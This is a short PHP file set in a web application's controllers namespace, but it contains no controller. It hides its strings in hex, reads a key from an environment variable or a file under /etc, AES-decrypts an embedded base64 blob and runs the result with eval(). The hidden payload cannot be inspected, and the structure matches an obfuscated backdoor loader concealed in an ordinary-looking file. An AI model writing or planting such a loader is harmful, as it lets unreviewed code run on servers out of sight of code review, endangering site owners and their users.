<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('uFA4vGlAkSwDiikD6IYm4w==');

$c=base64_decode(

'jggLOm7pP2Wz3ama4cZvR/lvpOS1bgkD9k3Sdi/Trs2mNt2DQ95n+GKBEG7gc9q8Gqu6LlrMXdyH' .
'VPuk7SaLV07OryRMKc8EXdrv98O2lWhi0PjOV0WhH7htAojvU5nOmq2PDrGns9Pu2wQlZ3TMbpD3' .
'2kXENX1ijRhoSdntwyqb0Jy1QlYcuIrJvzyOWCb/jeWn9T4dHW26sFqN/bbZhlfjtsvdElGOuFJi' .
'01EctBl76HiLfZRWzKYmSOvD6aGr'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

